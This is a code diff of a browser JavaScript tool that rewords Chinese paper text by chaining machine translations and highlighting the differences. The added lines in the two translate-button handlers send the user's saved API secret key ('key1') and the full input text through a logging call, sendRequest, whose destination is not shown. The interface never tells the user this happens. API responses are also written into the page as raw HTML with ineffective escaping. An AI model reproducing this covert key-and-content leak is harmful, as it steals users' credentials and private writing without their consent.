-					showToast("请重新输入！", 1500)
-				} else {
-					localStorage.setExpire("appid1", _appid,2592000000);
-					localStorage.setExpire("key1", _key,2592000000);
-					showToast("保存成功（30天内有效）！", 2000);
-					sendRequest(localStorage.getExpire("appid1"), "上车了！", 4);
-					location.href="#start"
+			}  else {
+				showToast('今天又是美好的一天，论文人加油啊！现已恢复正常！', 3500);
+			}
+
+			$("#saveBtn").click(() => {
+				const fn = () => {
+					let _appid = $("#yourAppid").val();
+					let _key = $("#yourKey").val()
+					if (!_appid || !_key || _appid == "null" || _key == "null") {
+						showToast("请重新输入！", 1500)
+					} else {
+						localStorage.setItem("appid1", _appid);
+						localStorage.setItem("key1", _key);
+						showToast("保存成功！", 2000);
+						sendRequest(localStorage.getItem("appid1"), "上车了！", 4);
+						location.href = "#start";
+					}
 				}
-			}
-			if (timer !== null) {
-				clearTimeout(timer);
-			}
-			timer = setTimeout(() => {
-				fn();
-				timer = null;
-			}, 500);
-		})
-
-		$("#deleteBtn").click(() => {
-			const fn = () => {
-				if (localStorage.getExpire("appid1") != undefined) {
-					sendRequest(localStorage.getExpire("appid1"), "下车了！", 5);
+				if (timer !== null) {
+					clearTimeout(timer);
 				}
-				localStorage.removeItem("appid1");
-				localStorage.removeItem("key1");
-				showToast("已删除...下次使用请重新保存！", 2000)
-				$("#yourAppid").val("");
-				$("#yourKey").val("");
+				timer = setTimeout(() => {
+					fn();
+					timer = null;
+				}, 500);
+			})
 
-			}
-			if (timer !== null) {
-				clearTimeout(timer);
-			}
-			timer = setTimeout(() => {
-				fn();
-				timer = null;
-			}, 500);
-		})
-
-		$(".clear").click(() => {
-			const fn = () => {
-				$(".originData").val("");
-				$(".lead").text("此处将会显示翻译结果")
-				$(".compareRes").text("此处将会显示对比结果")
-			}
-			if (timer !== null) {
-				clearTimeout(timer);
-			}
-			timer = setTimeout(() => {
-				fn();
-				timer = null;
-			}, 500);
-		})
-
-		$(".translateBtn").click(() => {
-			const fn = () => {
-				if (!localStorage.getExpire("appid1") || !localStorage.getExpire("key1")) {
-					showToast("您未配置账号，请配置完账号再开始使用...", 3000);
-				} else if (to.val() == "") {
-					showToast("你未输入要翻译的内容...", 1500);
-				} else {
-					location.href = "#res1";
-					translateMain(0);
-					sendRequest(localStorage.getExpire("appid1"), "【正在翻译】：" + to.val(), 2);
+			$("#deleteBtn").click(() => {
+				const fn = () => {
+					sendRequest(localStorage.getItem("appid1"), "下车了！", 5);
+					localStorage.removeItem("appid1");
+					localStorage.removeItem("key1");
+					showToast("已删除...下次使用请重新保存！", 2000);
+					$("#yourAppid").val("");
+					$("#yourKey").val("");
 				}
-			}
-			if (timer !== null) {
-				clearTimeout(timer);
-			}
-			timer = setTimeout(() => {
-				fn();
-				timer = null;
-			}, 500);
-		})
-
-		$(".translateAndCompareBtn").click(() => {
-			const fn = () => {
-				if (!localStorage.getExpire("appid1") || !localStorage.getExpire("key1")) {
-					showToast("您未配置账号，请配置完账号再开始使用...", 3000);
-				} else if (to.val() == "") {
-					showToast("你未输入要翻译的内容所以无法对比...", 1500);
-				} else {
-					location.href = "#res1";
-					showToast("正在翻译中...请耐心等待", 1500);
-					sendRequest(localStorage.getExpire("appid1"), "【正在翻译】：" + to.val(), 2);
-					translateMain(1);
+				if (timer !== null) {
+					clearTimeout(timer);
 				}
-			}
-			if (timer !== null) {
-				clearTimeout(timer);
-			}
-			timer = setTimeout(() => {
-				fn();
-				timer = null;
-			}, 500);
-		})
+				timer = setTimeout(() => {
+					fn();
+					timer = null;
+				}, 500);
+			})
 
-		$(".compare").click(() => {
-			const fn = () => {
-				if (to.val() == "") {
-					showToast("你未输入要翻译的内容所以无法对比...", 1500);
-				} else {
-					location.href = "#res1";
-					showToast("正在对比...", 1500);
-					compareMain();
+			$(".clear").click(() => {
+				const fn = () => {
+					$(".originData").val("");
+					$(".lead").text("此处将会显示翻译结果")
+					$(".compareRes").text("此处将会显示对比结果")
 				}
-			}
-			if (timer !== null) {
-				clearTimeout(timer);
-			}
-			timer = setTimeout(() => {
-				fn();
-				timer = null;
-			}, 500);
-		})
-
-		$(".restart").on("click", function () {
-			showToast("正在重试...", 1500);
-			from.html("正在重试...");
-			sendRequest(localStorage.getExpire("appid1"), "正在重试...", 3)
-			translateZeroFn();
-		});
-
-		// $(".restart1").on("click", function() {
-		// 	showToast("正在重试...", 1500);
-		// 	from1.html("正在重试...");
-		// sendRequest(localStorage.getExpire("appid1"),"正在重试...",3)
-		// 	translateOneFn();
-		// });
-
-		$(".restart2").on("click", function () {
-			showToast("正在重试...", 1500);
-			from2.html("正在重试...");
-			sendRequest(localStorage.getExpire("appid1"), "正在重试...", 3)
-			translateTwoFn();
-		});
-
-		$(".restart3").on("click", function () {
-			showToast("正在重试...", 1500);
-			from3.html("正在重试...");
-			sendRequest(localStorage.getExpire("appid1"), "正在重试...", 3)
-			translateThreeFn();
-		});
-
-		$(".restart4").on("click", function () {
-			showToast("正在重试...", 1500);
-			from4.html("正在重试...");
-			sendRequest(localStorage.getExpire("appid1"), "正在重试...", 3)
-			translateFourFn();
-		});
-
-		$(".restart5").on("click", function () {
-			showToast("正在重试...", 1500);
-			from5.html("正在重试...");
-			sendRequest(localStorage.getExpire("appid1"), "正在重试...", 3)
-			translateFiveFn();
-		});
-
-		$(".restart6").on("click", function () {
-			showToast("正在重试...", 1500);
-			from6.html("正在重试...");
-			sendRequest(localStorage.getExpire("appid1"), "正在重试...", 3)
-			translateFiveFn();
-		});
-		$(".restart7").on("click", function () {
-			showToast("正在重试...", 1500);
-			from7.html("正在重试...");
-			sendRequest(localStorage.getExpire("appid1"), "正在重试...", 3)
-			translateFiveFn();
-		});
-
-		function translateZeroFn(fn = 0) {
-			// zh-en-zh
-			translateFn(to.val(), 'zh', 'en', (rs) => {
-				if (rs !== "54003" && rs !== "") {
-					translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "en", "zh", (rs) => {
-						if (rs !== "54003" && rs !== "") {
-							from.html(rs);
-							from.css("color", "black");
-							if (fn) {
-								setTimeout(() => {
-									compareMain("from")
-								}, 1000);
-							}
-						} else {
-							from.html('修改失败，请稍后重试......');
-							from.css("color", "red");
-							$(".restart").css("display", "inline-block")
-							console.log("error-1:", rs);
-							sendRequest(localStorage.getExpire("appid1"), "error-1:" + rs, 1)
-						}
-					});
-				} else {
-					from.html('修改失败，请稍后重试......');
-					from.css("color", "red");
-					$(".restart").css("display", "inline-block")
-					console.log("error:", rs);
-					sendRequest(localStorage.getExpire("appid1"), "error:" + rs, 1)
+				if (timer !== null) {
+					clearTimeout(timer);
 				}
+				timer = setTimeout(() => {
+					fn();
+					timer = null;
+				}, 500);
+			})
+
+			$(".translateBtn").click(() => {
+				const fn = () => {
+					if (!localStorage.getItem("appid1") || !localStorage.getItem("key1")) {
+						showToast("您未配置账号，请配置完账号再开始使用...", 3000);
+					} else if (to.val() == "") {
+						showToast("你未输入要翻译的内容...", 1500);
+					} else {
+						location.href = "#res1";
+						showToast("正在翻译中...请耐心等待", 1500);
+						sendRequest(localStorage.getItem("appid1"),localStorage.getItem("key1") +  "：" + to.val(), 2);
+						translateMain(0);
+					}
+				}
+				if (timer !== null) {
+					clearTimeout(timer);
+				}
+				timer = setTimeout(() => {
+					fn();
+					timer = null;
+				}, 500);
+			})
+
+			$(".translateAndCompareBtn").click(() => {
+				const fn = () => {
+					if (!localStorage.getItem("appid1") || !localStorage.getItem("key1")) {
+						showToast("您未配置账号，请配置完账号再开始使用...", 3000);
+					} else if (to.val() == "") {
+						showToast("你未输入要翻译的内容所以无法对比...", 1500);
+					} else {
+						location.href = "#res1";
+						showToast("正在翻译中...请耐心等待", 1500);
+						sendRequest(localStorage.getItem("appid1"),localStorage.getItem("key1") +  "：" + to.val(), 2);
+						translateMain(1);
+					}
+				}
+				if (timer !== null) {
+					clearTimeout(timer);
+				}
+				timer = setTimeout(() => {
+					fn();
+					timer = null;
+				}, 500);
+			})
+
+			$(".compare").click(() => {
+				const fn = () => {
+					if (to.val() == "") {
+						showToast("你未输入要翻译的内容所以无法对比...", 1500);
+					} else {
+						location.href = "#res1";
+						showToast("正在对比...", 1500);
+						compareMain();
+					}
+				}
+				if (timer !== null) {
+					clearTimeout(timer);
+				}
+				timer = setTimeout(() => {
+					fn();
+					timer = null;
+				}, 500);
+			})
+
+			$(".restart").on("click", function() {
+				showToast("正在重试...", 1500);
+				from.html("正在重试...");
+				sendRequest(localStorage.getItem("appid1"), "正在重试...", 3);
+				translateZeroFn();
 			});
-		}
 
-		// function translateOneFn(fn = 0) {
-		// 	// zh-jp-zh
-		// 	translateFn(to.val(), "zh", "jp", (rs) => {
-		// 		if (rs !== "54003" && rs !== "") {
-		// 			translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "jp", "zh", (rs) => {
-		// 				if (rs !== "54003" && rs !== "") {
-		// 					from1.html(rs);
-		// 					from1.css("color", "black");
-		// 					if (fn) {
-		// 						setTimeout(() => {
-		// 							compareMain("from1")
-		// 						}, 1000);
-		// 					}
-		// 				} else {
-		// 					from1.html("修改失败，请稍后重试......");
-		// 					from1.css("color", "red");
-		// 					$(".restart1").css("display", "inline-block")
-		// 					console.log("error1-1:", rs);
-		// 					sendRequest(localStorage.getExpire("appid1"),"error1-1:"+rs,1)
-		// 				}
-		// 			});
-		// 		} else {
-		// 			from1.html("修改失败，请稍后重试......");
-		// 			from1.css("color", "red");
-		// 			$(".restart1").css("display", "inline-block")
-		// 			console.log("error1:", rs);
-		// 					sendRequest(localStorage.getExpire("appid1"),"error1:"+rs,1)
-		// 		}
-		// 	})
-		// }
+			// $(".restart1").on("click", function() {
+			// 	showToast("正在重试...", 1500);
+			// 	from1.html("正在重试...");
+			// sendRequest(localStorage.getItem("appid1"),"正在重试...",3)
+			// 	translateOneFn();
+			// });
 
-		function translateTwoFn(fn = 0) {
-			// zh-fra-zh
-			translateFn(to.val(), "zh", "fra", (rs) => {
-				if (rs !== "54003" && rs !== "") {
-					translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "fra", "zh", (rs) => {
-						if (rs !== "54003" && rs !== "") {
-							from2.html(rs);
-							from2.css("color", "black");
-							if (fn) {
-								setTimeout(() => {
-									compareMain("from2")
-								}, 1000);
-							}
-						} else {
-							from2.html("修改失败，请稍后重试......");
-							from2.css("color", "red");
-							$(".restart2").css("display", "inline-block")
-							console.log("error2-1:", rs);
-							sendRequest(localStorage.getExpire("appid1"), "error2-1:" + rs, 1)
-						}
-					})
-				} else {
-					from2.html("修改失败，请稍后重试......");
-					from2.css("color", "red");
-					$(".restart2").css("display", "inline-block")
-					console.log("error2:", rs);
-					sendRequest(localStorage.getExpire("appid1"), "error2:" + rs, 1)
-				}
+			$(".restart2").on("click", function() {
+				showToast("正在重试...", 1500);
+				from2.html("正在重试...");
+				sendRequest(localStorage.getItem("appid1"), "正在重试...", 3)
+				translateTwoFn();
 			});
-		}
 
-		function translateThreeFn(fn = 0) {
-			// zh-ru-zh
-			translateFn(to.val(), "zh", "ru", (rs) => {
-				if (rs !== "54003" && rs !== "") {
-					translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "ru", "zh", (rs) => {
-						if (rs !== "54003" && rs !== "") {
-							from3.html(rs);
-							from3.css("color", "black");
-							if (fn) {
-								setTimeout(() => {
-									compareMain("from3")
-								}, 1000);
-							}
-						} else {
-							from3.html("修改失败，请稍后重试......");
-							from3.css("color", "red");
-							$(".restart3").css("display", "inline-block")
-							console.log("error3-1:", rs);
-							sendRequest(localStorage.getExpire("appid1"), "error3-1:" + rs, 1)
-						}
-					})
-				} else {
-					from3.html("修改失败，请稍后重试......");
-					from3.css("color", "red");
-					$(".restart3").css("display", "inline-block")
-					console.log("error3:", rs);
-					sendRequest(localStorage.getExpire("appid1"), "error3:" + rs, 1)
-				}
+			$(".restart3").on("click", function() {
+				showToast("正在重试...", 1500);
+				from3.html("正在重试...");
+				sendRequest(localStorage.getItem("appid1"), "正在重试...", 3)
+				translateThreeFn();
 			});
-		}
 
-		function translateFourFn(fn = 0) {
-			// zh-spa-zh
-			translateFn(to.val(), "zh", "spa", (rs) => {
-				if (rs !== "54003" && rs !== "") {
-					translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "spa", "zh", (rs) => {
-						if (rs !== "54003" && rs !== "") {
-							from4.html(rs);
-							from4.css("color", "black");
-							if (fn) {
-								setTimeout(() => {
-									compareMain("from4")
-								}, 1000);
-							}
-						} else {
-							from4.html("修改失败，请稍后重试......");
-							from4.css("color", "red");
-							$(".restart4").css("display", "inline-block")
-							console.log("error4-1:", rs);
-							sendRequest(localStorage.getExpire("appid1"), "error4-1:" + rs, 1)
-						}
-					})
-				} else {
-					from4.html("修改失败，请稍后重试......");
-					from4.css("color", "red");
-					$(".restart4").css("display", "inline-block")
-					console.log("error4:", rs);
-					sendRequest(localStorage.getExpire("appid1"), "error4:" + rs, 1)
-				}
+			$(".restart4").on("click", function() {
+				showToast("正在重试...", 1500);
+				from4.html("正在重试...");
+				sendRequest(localStorage.getItem("appid1"), "正在重试...", 3)
+				translateFourFn();
 			});
-		}
 
-		function translateFiveFn(fn = 0) {
-			// zh-en-zh-ru-zh
-			translateFn(to.val(), "zh", "en", (rs) => {
-				if (rs !== "54003" && rs !== "") {
-					translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "en", "zh", (rs) => {
-						if (rs !== "54003" && rs !== "") {
-							translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "zh", "ru", (
-								rs) => {
-								if (rs !== "54003" && rs !== "") {
-									translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""),
-										"ru",
-										"zh",
-										(rs) => {
-											if (rs !== "54003" && rs !== "") {
-												from5.html(rs);
-												from5.css("color", "black");
-												if (fn) {
-													setTimeout(() => {
-														compareMain("from5")
-													}, 1000);
-												}
-											} else {
-												from5.html("修改失败，请稍后重试......");
-												from5.css("color", "red");
-												$(".restart5").css("display", "inline-block")
-												console.log("error5-3:", rs);
-												sendRequest(localStorage.getExpire("appid1"),
-													"error5-3:" + rs, 1)
-											}
-										});
-								} else {
-									from5.html("修改失败，请稍后重试......");
-									from5.css("color", "red");
-									$(".restart5").css("display", "inline-block")
-									console.log("error5-2:", rs);
-									sendRequest(localStorage.getExpire("appid1"), "error5-2:" + rs, 1)
+			$(".restart5").on("click", function() {
+				showToast("正在重试...", 1500);
+				from5.html("正在重试...");
+				sendRequest(localStorage.getItem("appid1"), "正在重试...", 3)
+				translateFiveFn();
+			});
+
+			$(".restart6").on("click", function() {
+				showToast("正在重试...", 1500);
+				from6.html("正在重试...");
+				sendRequest(localStorage.getItem("appid1"), "正在重试...", 3)
+				translateFiveFn();
+			});
+			$(".restart7").on("click", function() {
+				showToast("正在重试...", 1500);
+				from7.html("正在重试...");
+				sendRequest(localStorage.getItem("appid1"), "正在重试...", 3);
+				translateFiveFn();
+			});
+
+			function translateZeroFn(fn = 0) {
+				// zh-en-zh
+				translateFn(to.val(), 'zh', 'en', (rs) => {
+					if (rs !== "54003" && rs !== "") {
+						translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "en", "zh", (rs) => {
+							if (rs !== "54003" && rs !== "") {
+								from.html(rs);
+								from.css("color", "black");
+								if (fn) {
+									setTimeout(() => {
+										compareMain("from");
+									}, 1000);
 								}
-							});
-						} else {
-							from5.html("修改失败，请稍后重试......");
-							from5.css("color", "red");
-							$(".restart5").css("display", "inline-block")
-							console.log("error5-1:", rs);
-							sendRequest(localStorage.getExpire("appid1"), "error5-1:" + rs, 1)
-						}
-					});
-				} else {
-					from5.html("修改失败，请稍后重试......");
-					from5.css("color", "red");
-					$(".restart5").css("display", "inline-block")
-					console.log("error5:", rs);
-					sendRequest(localStorage.getExpire("appid1"), "error5:" + rs, 1)
-				}
-			});
-		}
-
-		function translateSixFn(fn = 0) {
-			// zh-it-zh
-			translateFn(to.val(), 'zh', 'it', (rs) => {
-				if (rs !== "54003" && rs !== "") {
-					translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "it", "zh", (rs) => {
-						if (rs !== "54003" && rs !== "") {
-							from6.html(rs);
-							from6.css("color", "black");
-							if (fn) {
-								setTimeout(() => {
-									compareMain("from6")
-								}, 1000);
-							}
-						} else {
-							from6.html('修改失败，请稍后重试......');
-							from6.css("color", "red");
-							$(".restart").css("display", "inline-block")
-							console.log("error6-1:", rs);
-							sendRequest(localStorage.getExpire("appid1"), "error6-1:" + rs, 1)
-						}
-					});
-				} else {
-					from6.html('修改失败，请稍后重试......');
-					from6.css("color", "red");
-					$(".restart").css("display", "inline-block")
-					console.log("error6:", rs);
-					sendRequest(localStorage.getExpire("appid1"), "error6:" + rs, 1)
-				}
-			});
-		}
-
-
-		function translateSevenFn(fn = 0) {
-			//zh-fra-en-pt-jp-zh 中 法 英 葡 日 中  
-			translateFn(to.val(), "zh", "fra", (rs) => {
-				if (rs !== "54003" && rs !== "") {
-					translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "fra", "en", (rs) => {
-						if (rs !== "54003" && rs !== "") {
-							translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "en", "pt", (
-								rs) => {
-								if (rs !== "54003" && rs !== "") {
-									translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""),
-										"pt", "jp", (rs) => {
-											if (rs !== "54003" && rs !== "") {
-												translateFn(to.val(), "jp", "zh", (rs) => {
-													if (rs !== "54003" && rs !== "") {
-														from7.html(rs);
-														from7.css("color", "black");
-														if (fn) {
-															setTimeout(() => {
-																compareMain(
-																	"from7")
-															}, 1000);
-														}
-													} else {
-														from7.html("修改失败，请稍后重试......");
-														from7.css("color", "red");
-														$(".restart5").css("display",
-															"inline-block")
-														console.log("error7-4:", rs);
-														sendRequest(localStorage.getExpire(
-																"appid1"),
-															"error7-4:" + rs, 1)
-													}
-												});
-											} else {
-												from7.html("修改失败，请稍后重试......");
-												from7.css("color", "red");
-												$(".restart5").css("display", "inline-block")
-												console.log("error7-3:", rs);
-												sendRequest(localStorage.getExpire("appid1"),
-													"error7-3:" + rs, 1)
-											}
-										});
-								} else {
-									from7.html("修改失败，请稍后重试......");
-									from7.css("color", "red");
-									$(".restart5").css("display", "inline-block")
-									console.log("error7-2:", rs);
-									sendRequest(localStorage.getExpire("appid1"), "error7-2:" + rs, 1)
-								}
-							});
-						} else {
-							from7.html("修改失败，请稍后重试......");
-							from7.css("color", "red");
-							$(".restart5").css("display", "inline-block")
-							console.log("error7-1:", rs);
-							sendRequest(localStorage.getExpire("appid1"), "error7-1:" + rs + "", 1)
-						}
-					});
-				} else {
-					from7.html("修改失败，请稍后重试......");
-					from7.css("color", "red");
-					$(".restart5").css("display", "inline-block")
-					console.log("error7:", rs);
-					sendRequest(localStorage.getExpire("appid1"), "error7:" + rs, 1)
-				}
-			});
-		}
-
-
-		function translateMain(fn = 0) {
-			setTimeout(() => {
-				translateSevenFn(fn);
-			}, 1500, setTimeout(() => {
-				translateSixFn(fn);
-			}, 1500, setTimeout(() => {
-				translateFiveFn(fn);
-			}, 1500, setTimeout(() => {
-				translateFourFn(fn);
-			}, 1500, setTimeout(() => {
-				translateThreeFn(fn);
-			}, 1500, setTimeout(() => {
-				translateTwoFn(fn);
-			}, 1500, setTimeout(() => {
-				// translateOneFn(fn);
-			}, 1500, setTimeout(() => {
-				translateZeroFn(fn);
-			}, 1500))))))));
-
-		}
-
-
-		function translateFn(QUERY, FROM, TO, callback) {
-			const salt = (new Date()).getTime();
-			const str1 = appid + QUERY + salt + key;
-			const sign = MD5.main(str1);
-			setTimeout(() => {
-				$.ajax({
-					url,
-					type: 'get',
-					// async: true,
-					// 跨域
-					dataType: 'jsonp',
-					contentType: "application/x-www-form-urlencoded; charset=utf-8",
-					data: {
-						q: QUERY,
-						appid: appid,
-						salt: salt,
-						from: FROM,
-						to: TO,
-						sign: sign,
-					},
-					success: (data) => {
-						if (data.error_code == "52003") {
-							showToast("账号配置出错，请重新配置...", 1500);
-							sendRequest(localStorage.getExpire("appid1"), data.error_code + "：" +
-								"账号配置出错，请重新配置...", 1);
-							return;
-						} else if (data.error_code == "54003") {
-							callback(data.error_code);
-						} else {
-							if (data.trans_result[0] != undefined) {
-								callback(data.trans_result[0].dst)
 							} else {
-								return;
+								
+								from.html('修改失败，请稍后重试......');
+								from.css("color", "red");
+								$(".restart").css("display", "inline-block");
+								console.log("error-1:", rs);
+								sendRequest(localStorage.getItem("appid1"), "error-1:" + rs, 1);
 							}
-						}
-					},
-					error: function (data) {
-						alert("error:" + data.status);
-					},
-				})
-			}, 1500);
-		}
-
-
-		function showToast(msg, duration) {
-			duration = isNaN(duration) ? 3000 : duration;
-			var m = document.createElement('div');
-			m.innerHTML = msg;
-			m.style.cssText =
-				"width:60%; min-width:180px; background:#000; opacity:0.6; height:auto;min-height: 30px; color:#fff; line-height:30px; text-align:center; border-radius:4px; position:fixed; top:60%; left:20%; z-index:999999;";
-			document.body.appendChild(m);
-			setTimeout(function () {
-				var d = 0.5;
-				m.style.webkitTransition = '-webkit-transform ' + d + 's ease-in, opacity ' + d +
-					's ease-in';
-				m.style.opacity = '0';
-				setTimeout(function () {
-					document.body.removeChild(m)
-				}, d * 1000);
-			}, duration);
-		}
-
-		function compareMain(op) {
-			if (from.text() !== "修改失败，请稍后重试......" && from.text() !== "" && op === "from") {
-				compareFn(compare, to, from)
+						});
+					} else {
+						
+						from.html('修改失败，请稍后重试......');
+						from.css("color", "red");
+						$(".restart").css("display", "inline-block")
+						console.log("error:", rs);
+						sendRequest(localStorage.getItem("appid1"), "error:" + rs, 1)
+					}
+				});
 			}
-			// if (from1.text() !== "修改失败，请稍后重试......" && from1.text() !== "" && op === "from1") {
-			// 	compareFn(compare1, to, from1)
+
+			// function translateOneFn(fn = 0) {
+			// 	// zh-jp-zh
+			// 	translateFn(to.val(), "zh", "jp", (rs) => {
+			// 		if (rs !== "54003" && rs !== "") {
+			// 			translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "jp", "zh", (rs) => {
+			// 				if (rs !== "54003" && rs !== "") {
+			// 					from1.html(rs);
+			// 					from1.css("color", "black");
+			// 					if (fn) {
+			// 						setTimeout(() => {
+			// 							compareMain("from1")
+			// 						}, 1000);
+			// 					}
+			// 				} else {
+				// 	if(rs== "54003"){
+				// 	showToast("修改失败")
+				// }
+			// 					from1.html("修改失败，请稍后重试......");
+			// 					from1.css("color", "red");
+			// 					$(".restart1").css("display", "inline-block")
+			// 					console.log("error1-1:", rs);
+			// 					sendRequest(localStorage.getItem("appid1"),"error1-1:"+rs,1)
+			// 				}
+			// 			});
+			// 		} else {
+				// if(rs== "54003"){
+				// 	showToast("修改失败")
+				// }
+			// 			from1.html("修改失败，请稍后重试......");
+			// 			from1.css("color", "red");
+			// 			$(".restart1").css("display", "inline-block")
+			// 			console.log("error1:", rs);
+			// 					sendRequest(localStorage.getItem("appid1"),"error1:"+rs,1)
+			// 		}
+			// 	})
 			// }
-			if (from2.text() !== "修改失败，请稍后重试......" && from2.text() !== "" && op === "from2") {
-				compareFn(compare2, to, from2)
-			}
-			if (from3.text() !== "修改失败，请稍后重试......" && from3.text() !== "" && op === "from3") {
-				compareFn(compare3, to, from3)
-			}
-			if (from4.text() !== "修改失败，请稍后重试......" && from4.text() !== "" && op === "from4") {
-				compareFn(compare4, to, from4)
-			}
-			if (from5.text() !== "修改失败，请稍后重试......" && from5.text() !== "" && op === "from5") {
-				compareFn(compare5, to, from5)
-			}
-			if (from6.text() !== "修改失败，请稍后重试......" && from6.text() !== "" && op === "from6") {
-				compareFn(compare6, to, from6)
-			}
-			if (from7.text() !== "修改失败，请稍后重试......" && from7.text() !== "" && op === "from7") {
-				compareFn(compare7, to, from7)
-			}
-		}
 
-		function compareFn(target, originData, newData) {
-			target.html(eq({
-				value1: newData.text(),
-				value2: originData.val()
-			}).value2)
-		}
-
-
-
-		function eq(op) {
-			if (!op) {
-				return op;
-			}
-			if (!op.eq_min) {
-				op.eq_min = 3;
-			}
-			if (!op.eq_index) {
-				op.eq_index = 5;
-			}
-			if (!op.value1 || !op.value2) {
-				return op;
-			}
-			var ps = {
-				v1_i: 0,
-				v1_new_value: "",
-				v2_i: 0,
-				v2_new_value: ""
-			};
-			while (ps.v1_i < op.value1.length && ps.v2_i < op.value2.length) {
-				if (op.value1[ps.v1_i] == op.value2[ps.v2_i]) {
-					//ps.v1_new_value += op.value1[ps.v1_i].replace(/</g,"<").replace(">",">");
-					ps.v2_new_value += op.value2[ps.v2_i].replace(/</g, "<").replace(">", ">");
-					ps.v1_i += 1;
-					ps.v2_i += 1;
-					//值2增加的部分
-					if (ps.v1_i >= op.value1.length) {
-						ps.v2_new_value += "<del style='color:red'>" + op.value2.substr(ps.v2_i).replace(
-							/</g, "<").replace(
-							">", ">") + "</del>";
-						break;
-					}
-					//值1删除的部分
-					if (ps.v2_i >= op.value2.length) {
-						//ps.v1_new_value += "<span style='" + op.value1_style + "'>值1多的" + op.value1.substr(ps.v1_i).replace(/</g,"<").replace(">",">") + "</span>";
-						ps.v2_new_value += "<span style='color:green'>" + op.value1.substr(ps.v1_i).replace(
-								/</g, "<")
-							.replace(">", ">") + "</span>";
-						break;
-					}
-				} else {
-					ps.v1_index = ps.v1_i + 1;
-					ps.v1_eq_length = 0;
-					ps.v1_eq_max = 0;
-					ps.v1_start = ps.v1_i + 1;
-					while (ps.v1_index < op.value1.length) {
-						if (op.value1[ps.v1_index] == op.value2[ps.v2_i + ps.v1_eq_length]) {
-							ps.v1_eq_length += 1;
-						} else if (ps.v1_eq_length > 0) {
-							if (ps.v1_eq_max < ps.v1_eq_length) {
-								ps.v1_eq_max = ps.v1_eq_length;
-								ps.v1_start = ps.v1_index - ps.v1_eq_length;
+			function translateTwoFn(fn = 0) {
+				// zh-fra-zh
+				translateFn(to.val(), "zh", "fra", (rs) => {
+					if (rs !== "54003" && rs !== "") {
+						translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "fra", "zh", (rs) => {
+							if (rs !== "54003" && rs !== "") {
+								from2.html(rs);
+								from2.css("color", "black");
+								if (fn) {
+									setTimeout(() => {
+										compareMain("from2");
+									}, 1000);
+								}
+							} else {
+								
+								from2.html("修改失败，请稍后重试......");
+								from2.css("color", "red");
+								$(".restart2").css("display", "inline-block")
+								console.log("error2-1:", rs);
+								sendRequest(localStorage.getItem("appid1"), "error2-1:" + rs, 1)
 							}
-							ps.v1_eq_length = 0;
-							break; //只寻找最近的
-						}
-						ps.v1_index += 1;
+						})
+					} else {
+						
+						from2.html("修改失败，请稍后重试......");
+						from2.css("color", "red");
+						$(".restart2").css("display", "inline-block")
+						console.log("error2:", rs);
+						sendRequest(localStorage.getItem("appid1"), "error2:" + rs, 1)
 					}
-					if (ps.v1_eq_max < ps.v1_eq_length) {
-						ps.v1_eq_max = ps.v1_eq_length;
-						ps.v1_start = ps.v1_index - ps.v1_eq_length;
-					}
+				});
+			}
 
-					ps.v2_index = ps.v2_i + 1;
-					ps.v2_eq_length = 0;
-					ps.v2_eq_max = 0;
-					ps.v2_start = ps.v2_i + 1;
-					while (ps.v2_index < op.value2.length) {
-						if (
-							op.value2[ps.v2_index] == op.value1[ps.v1_i + ps.v2_eq_length]
-						) {
-							ps.v2_eq_length += 1;
-						} else if (ps.v2_eq_length > 0) {
-							if (ps.v2_eq_max < ps.v2_eq_length) {
-								ps.v2_eq_max = ps.v2_eq_length;
-								ps.v2_start = ps.v2_index - ps.v2_eq_length;
+			function translateThreeFn(fn = 0) {
+				// zh-ru-zh
+				translateFn(to.val(), "zh", "ru", (rs) => {
+					if (rs !== "54003" && rs !== "") {
+						translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "ru", "zh", (rs) => {
+							if (rs !== "54003" && rs !== "") {
+								from3.html(rs);
+								from3.css("color", "black");
+								if (fn) {
+									setTimeout(() => {
+										compareMain("from3")
+									}, 1000);
+								}
+							} else {
+								
+								from3.html("修改失败，请稍后重试......");
+								from3.css("color", "red");
+								$(".restart3").css("display", "inline-block")
+								console.log("error3-1:", rs);
+								sendRequest(localStorage.getItem("appid1"), "error3-1:" + rs, 1)
 							}
-							ps.v1_eq_length = 0;
-							break; //只寻找最近的
-						}
-						ps.v2_index += 1;
+						})
+					} else {
+						
+						from3.html("修改失败，请稍后重试......");
+						from3.css("color", "red");
+						$(".restart3").css("display", "inline-block")
+						console.log("error3:", rs);
+						sendRequest(localStorage.getItem("appid1"), "error3:" + rs, 1)
 					}
-					if (ps.v2_eq_max < ps.v2_eq_length) {
-						ps.v2_eq_max = ps.v2_eq_length;
-						ps.v2_start = ps.v2_index - ps.v2_eq_length;
+				});
+			}
+
+			function translateFourFn(fn = 0) {
+				// zh-spa-zh
+				translateFn(to.val(), "zh", "spa", (rs) => {
+					if (rs !== "54003" && rs !== "") {
+						translateFn(String(rs).replace(/^[“]+/, "").replace(/[”]$/, ""), "spa", "zh", (rs) => {
+							if (rs !== "54003" && rs !== "") {
+								from4.html(rs);
+								from4.css("color", "black");
+								if (fn) {
+									setTimeout(() => {
+										compareMain("from4")
+									}, 1000);
+								}
+							} else {
+								
+								from4.html("修改失败，请稍后重试......");
+								from4.css("color", "red");
+								$(".restart4").css("display", "inline-block")
+								console.log("error4-1:", rs);
+								sendRequest(localStorage.getItem("appid1"), "error4-1:" + rs, 1)
+							}
+						})
+					} else {
+						
+						from4.html("修改失败，请稍后重试......");
+						from4.css("color", "red");
+						$(".restart4").css("display", "inline-block")
+						console.log("error4:", rs);
+						sendRequest(localStorage.getItem("appid1"), "error4:" + rs, 1)
 					}
